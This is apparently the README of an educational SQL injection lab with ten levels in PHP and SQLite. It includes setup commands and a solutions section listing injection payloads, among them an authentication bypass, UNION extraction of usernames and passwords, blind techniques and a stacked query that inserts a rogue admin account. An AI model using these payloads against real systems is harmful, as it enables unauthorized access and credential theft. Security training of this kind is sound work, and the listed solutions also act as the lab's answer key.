# 🛡️ SQL Injection Masterclass Suite (10 Levels)

> **⚠️ WARNING: EDUCATIONAL PURPOSES ONLY**
> This repository contains intentionally vulnerable code designed for security training and educational purposes. **DO NOT** deploy this code in a production environment. Hosting this environment on a public-facing server without strict isolation (e.g., containerization, network segmentation) is dangerous and can lead to server compromise.

---

[![Security Level: Educational](https://img.shields.io/badge/Security_Level-Educational-blue.svg)]()
[![PHP](https://img.shields.io/badge/Language-PHP-777bb4.svg)]()

Welcome to the **SQL Injection Masterclass Lab Suite**. This comprehensive, self-contained training arena contains 10 levels of increasing complexity, taking you from basic authentication bypasses and integer-based queries to UNION exfiltration, error-based disclosures, boolean/time-based blind SQLi, second-order injections, and full database compromise.

---

## 🎯 Lab Overview

| Level | Name | Primary Vulnerability |
| :--- | :--- | :--- |
| 🟢 | **Level 1** | Authentication Bypass |
| 🟢 | **Level 2** | Integer-Based Query Injection |
| 🟡 | **Level 3** | UNION-Based Exfiltration |
| 🟡 | **Level 4** | Error-Based Information Disclosure |
| 🔴 | **Level 5** | Boolean-Based Blind SQLi |
| 🔴 | **Level 6** | Time-Based Blind SQLi |
| 🔴 | **Level 7** | Second-Order SQL Injection |
| 🔴 | **Level 8** | File Read / Out-of-Band Extraction |
| 🟣 | **Level 9** | Stacked Queries & Schema Alteration |
| 🟣 | **Level 10** | SQLi to Full Database Compromise (Final Boss) |

---

## 🚀 Quick Start

Ensure you have [PHP](https://www.php.net/) installed on your system (SQLite is built-in).

```bash
# 1. Clone the repository
git clone https://github.com/zoly-zoly/SQLI-Lab.git
cd SQLI-Lab

# 2. Start the local server
php -S localhost:8080
```

👉 **Access the lab at:** `http://localhost:8080`

---

## 📓 Level Breakdown & Solutions

### 🟢 Level 1: Authentication Bypass
*   **Vulnerability:** Unescaped string concatenation in login SQL queries.
*   **Payload:** `admin' --`

### 🟢 Level 2: Integer-Based Query Injection
*   **Vulnerability:** Unquoted numeric parameter query evaluation.
*   **Payload:** `1 OR 1=1`

### 🟡 Level 3: UNION-Based Exfiltration
*   **Vulnerability:** Appending records via `UNION SELECT` matching original column counts.
*   **Payload:** `' UNION SELECT username, password, 0 FROM users --`

### 🟡 Level 4: Error-Based Information Disclosure
*   **Vulnerability:** Reflecting raw database execution errors to the screen.
*   **Payload:** `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --`

### 🔴 Level 5: Boolean-Based Blind SQLi
*   **Vulnerability:** True/false application state responses without error or output reflection.
*   **Payload:** `' AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='S' --`

### 🔴 Level 6: Time-Based Blind SQLi
*   **Vulnerability:** Static page responses requiring computational delay checks.
*   **Payload:** `' AND (SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 0 END) --`

### 🔴 Level 7: Second-Order SQL Injection
*   **Vulnerability:** Safely stored input executed in an unsafe secondary database query.
*   **Payload:** Injecting payloads during profile updates that trigger upon audit log searches.

### 🔴 Level 8: File Read / Out-of-Band Extraction
*   **Vulnerability:** Database functions allowing file system inspection or network calls.
*   **Payload:** Leveraging SQLite metadata / extension functions.

### 🟣 Level 9: Stacked Queries & Schema Alteration
*   **Vulnerability:** Executing multiple statements in a single request.
*   **Payload:** `; INSERT INTO users (username, password, role) VALUES ('hacker', 'pass', 'admin'); --`

### 🟣 Level 10: SQLi to Full Database Compromise (Final Boss)
*   **Vulnerability:** Combining authentication bypass, schema enumeration, and master flag extraction.
*   **Payload:** Comprehensive multi-stage database takeover chain.

---

## 🛡️ Security Policy & Disclaimer
Please see [SECURITY.md](SECURITY.md) for licensing and ethical usage instructions.

---
*Created with ❤️ by **Zoly** for Bug Bounty Mastery.*
